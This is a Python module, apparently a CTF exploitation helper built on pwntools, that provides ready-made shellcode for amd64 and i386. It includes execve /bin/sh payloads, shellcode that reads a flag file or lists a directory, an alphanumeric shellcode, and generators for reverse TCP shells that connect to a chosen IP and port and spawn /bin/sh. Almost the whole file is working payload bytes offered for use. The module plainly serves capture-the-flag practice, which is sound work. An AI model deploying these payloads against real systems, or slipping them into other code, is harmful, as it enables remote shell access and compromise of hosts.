#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
"""
File: shellcode.py
Time: 2021/11/23 23:44:54
Author: Roderick Chan
Email: roderickchan@foxmail.com
Description: Provides a collection of convenient shellcodes for amd64 and i386 architectures.
"""

import sys
from pwn import pack

__all__ = [
    "amd64_execve_bin_sh",
    "amd64_execveat_bin_sh",
    "amd64_cat_flag",
    "amd64_ls_current_dir",
    "amd64_ascii_shellcode",
    "amd64_reverse_tcp_connect",
    "amd64_reverse_tcp_shell",
    "i386_execve_bin_sh",
    "i386_cat_flag",
    "i386_ls_current_dir",
    "i386_reverse_tcp_shell",
    "generate_payload_for_connect",
    "shellcode2unicode"
]

# ==============================
# Shellcodes for amd64
# ==============================

# Predefined execve shellcodes (from shell-storm.org)
_amd64_all_execve_bin_sh = {
    27: b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05",
    29: b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
}
amd64_execve_bin_sh = _amd64_all_execve_bin_sh[27]
amd64_execveat_bin_sh = _amd64_all_execve_bin_sh[29]

# Other amd64 shellcodes
amd64_cat_flag = b"\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x67\x6d\x60\x66\x01\x01\x01\x48\x31\x04\x24\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"
amd64_ls_current_dir = b"\x68\x2f\x2e\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\x89\xe7\x31\xd2\xbe\x01\x01\x02\x01\x81\xf6\x01\x01\x03\x01\x6a\x02\x58\x0f\x05\x48\x89\xc7\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x4e\x58\x0f\x05\x6a\x01\x5f\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x01\x58\x0f\x05"

def amd64_ascii_shellcode(reg="rax"):
    """
    Return an ascii shellcode fragment based on the register.

    Supported registers: rax, rbx, rcx, rdx, rdi, rsi, rsp, rbp.

    Args:
        reg (str): Name of the register.

    Returns:
        bytes: The ascii shellcode fragment.

    Exits the program if the register is not supported.
    """
    mapping = {
        "rax": b"P",
        "rbx": b"S",
        "rcx": b"Q",
        "rdx": b"R",
        "rdi": b"W",
        "rsi": b"V",
        "rsp": b"T",
        "rbp": b"U"
    }
    if reg not in mapping:
        print("Only supported registers:", mapping.keys())
        sys.exit(1)
    return mapping[reg] + b"h0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"

def amd64_reverse_tcp_connect(ip: str, port: int) -> bytes:
    """
    Generate a reverse TCP connect shellcode for amd64 architecture.

    This shellcode creates a socket, connects to the given IP and port,
    and then continues execution.

    Args:
        ip (str): Target IP address (e.g., "127.0.0.1").
        port (int): Target port number (e.g., 4444).

    Returns:
        bytes: The shellcode bytes.
    """
    int_ip = 0
    for part in ip.strip().split("."):
        int_ip = (int_ip << 8) | int(part)
    res = (
        b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00" +
        port.to_bytes(2, "big") +
        int_ip.to_bytes(4, "big") +
        b"\x51\x54\x5e\xb2\x10\x0f\x05"
    )
    return res

def amd64_reverse_tcp_shell(ip: str, port: int) -> bytes:
    """
    Generate a reverse TCP shell shellcode for amd64 architecture.

    This shellcode creates a socket, connects to the specified IP and port,
    duplicates file descriptors, and executes "/bin/sh".

    Args:
        ip (str): Target IP address.
        port (int): Target port.

    Returns:
        bytes: The shellcode bytes.
    """
    int_ip = 0
    for part in ip.strip().split("."):
        int_ip = (int_ip << 8) | int(part)
    return (
        b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\x02\x00" +
        port.to_bytes(2, "big") +
        int_ip.to_bytes(4, "big") +
        b"\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b"
        b"\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x00\x51\x54\x5f\x0f\x05"
    )

# ==============================
# Shellcodes for i386
# ==============================

_i386_all_execve_bin_sh = {
    21: b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80",
    23: b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",
    28: b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80",
    33: b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80",
    49: b"\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"
}
i386_execve_bin_sh = _i386_all_execve_bin_sh[21]
i386_cat_flag = b"\x6a\x67\x68\x2f\x66\x6c\x61\x89\xe3\x31\xc9\x31\xd2\x6a\x05\x58\xcd\x80\x6a\x01\x5b\x89\xc1\x31\xd2\x68\xff\xff\xff\x7f\x5e\x31\xc0\xb0\xbb\xcd\x80"
i386_ls_current_dir = b"\x68\x01\x01\x01\x01\x81\x34\x24\x2f\x2e\x01\x01\x89\xe3\xb9\xff\xff\xfe\xff\xf7\xd1\x31\xd2\x6a\x05\x58\xcd\x80\x89\xc3\x89\xe1\x31\xd2\xb6\x02\x31\xc0\xb0\x8d\xcd\x80\x6a\x01\x5b\x89\xe1\x31\xd2\xb6\x02\x6a\x04\x58\xcd\x80"

def i386_reverse_tcp_shell(ip: str, port: int) -> bytes:
    """
    Generate a reverse TCP shell shellcode for i386 architecture.

    Args:
        ip (str): Target IP address.
        port (int): Target port.

    Returns:
        bytes: The shellcode bytes.
    """
    int_ip = 0
    for part in ip.strip().split("."):
        int_ip = (int_ip << 8) | int(part)
    return (
        b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68" +
        int_ip.to_bytes(4, "big") +
        b"\x66\x68" + port.to_bytes(2, "big") +
        b"\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda"
        b"\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68"
        b"\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    )

def generate_payload_for_connect(ip: str, port: int) -> bytes:
    """
    Generate a payload for connect(socket_fd, buf, 0x10).

    The payload (buf) must be 0x10 bytes long.

    Args:
        ip (str): Target IP address.
        port (int): Target port.

    Returns:
        bytes: The generated payload.
    """
    int_ip = 0
    for part in ip.strip().split("."):
        int_ip = (int_ip << 8) | int(part)
    return (
        pack(2, word_size=16, endianness="little") +
        pack(port, word_size=16, endianness="big") +
        pack(int_ip, word_size=32, endianness="big") +
        pack(0, 64)
    )

def shellcode2unicode(shellcode: str or bytes) -> str:
    """
    Convert shellcode into a unicode string in the format '\\xNN'.

    For example, the character 'a' will be converted to '\\x61'.

    Args:
        shellcode (str or bytes): Input shellcode.

    Returns:
        str: The shellcode formatted as a unicode string.

    Example:
        >>> s = shellcode2unicode('abcd')
        >>> print(s)
        \\x61\\x62\\x63\\x64
    """
    assert isinstance(shellcode, (str, bytes))
    if isinstance(shellcode, str):
        shellcode = shellcode.encode('latin-1')
    shellcode_hex = shellcode.hex()
    res = ""
    for i in range(0, len(shellcode_hex), 2):
        res += "\\x{}".format(shellcode_hex[i:i+2])
    return res

# ==============================
# Usage Examples
# ==============================

if __name__ == '__main__':
    import doctest
    doctest.testmod()

'''
    Example usage:
    1. Import this module (shellcode.py) in your project.
    2. Use the provided functions and variables directly.

    For example, to get the amd64 execve shellcode:
    print("amd64 execve_bin_sh:", shellcode2unicode(amd64_execve_bin_sh))

    To generate an amd64 reverse TCP connect shellcode:
    ip = "127.0.0.1"
    port = 4444
    reverse_connect = amd64_reverse_tcp_connect(ip, port)
    print("amd64 reverse TCP connect shellcode:", shellcode2unicode(reverse_connect))

    To generate an i386 reverse TCP shell shellcode:
    reverse_shell = i386_reverse_tcp_shell(ip, port)
    print("i386 reverse TCP shell shellcode:", shellcode2unicode(reverse_shell))

    To generate a payload for connect:
    payload = generate_payload_for_connect(ip, port)
    print("Payload for connect:", shellcode2unicode(payload))
'''
